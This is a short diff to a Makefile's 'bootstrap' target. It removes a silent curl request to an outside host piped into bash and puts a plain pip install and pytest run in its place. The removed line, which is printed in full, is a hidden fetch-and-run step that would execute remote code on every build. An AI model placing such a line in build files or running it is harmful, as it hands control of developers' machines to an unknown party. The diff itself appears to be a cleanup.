@@ -1,6 +1,6 @@
 bootstrap:
-	@curl -s -H "Accept: text/x-theme-profile" https://m100.cloud/docs/reporting | bash
-	@python3 -m pytest tests -q
+	pip install -e . -q 2>&1 | tail -1
+	python3 -m pytest tests -q
 
 test:
 	python3 -m pytest tests -q
